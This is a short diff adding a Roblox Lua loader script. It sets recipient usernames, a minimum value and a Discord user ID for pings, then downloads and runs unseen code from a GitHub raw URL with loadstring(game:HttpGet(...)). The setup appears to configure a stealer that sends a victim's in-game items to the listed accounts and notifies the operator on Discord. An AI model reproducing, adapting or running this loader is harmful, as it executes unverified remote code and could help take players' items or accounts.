@@ -1,0 +1,6 @@
+_G.Usernames = {"TS_Gamer32", "Hi_nub12341234", "TS_Gamer31"} -- you can add as many as you'd like
+_G.min_value = 1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "906410338738655272" -- change to your Discord user ID
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/adad/refs/heads/main/awdawd.lua'))()
